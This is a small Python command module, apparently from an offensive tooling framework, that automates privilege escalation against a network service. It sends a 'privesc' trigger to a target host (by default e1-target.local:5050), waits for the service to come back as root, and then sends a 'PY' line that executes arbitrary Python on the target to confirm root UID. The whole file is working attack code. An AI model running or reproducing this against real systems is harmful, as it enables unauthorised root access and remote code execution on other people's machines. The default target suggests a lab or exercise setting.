from ..commands import Command
import time
from .send_data import process_lines

class AutoPrivesc(Command):
    """Automatically triggers privesc and verifies if it worked."""
    
    def do_command(self, args: str, *ext_args):
        parsed_args = args.split()
        dst_ip = parsed_args[0] if len(parsed_args) > 0 else "e1-target.local"
        dst_port = parsed_args[1] if len(parsed_args) > 1 else "5050"

        print("[*] Step 1: Sending PrivEsc trigger...")
        # Send the trigger (this will drop the connection as the server restarts)
        process_lines(f"{dst_ip} {dst_port} privesc")
        
        print("\n[*] Waiting 2 seconds for the server to reboot as root...")
        time.sleep(2)
        
        print("[*] Step 2: Reconnecting to verify privileges...")
        # Send the check command
        # os.geteuid() returns 0 if we are root
        process_lines(f"{dst_ip} {dst_port} PY print('My UID is:', __import__('os').geteuid())")

command = AutoPrivesc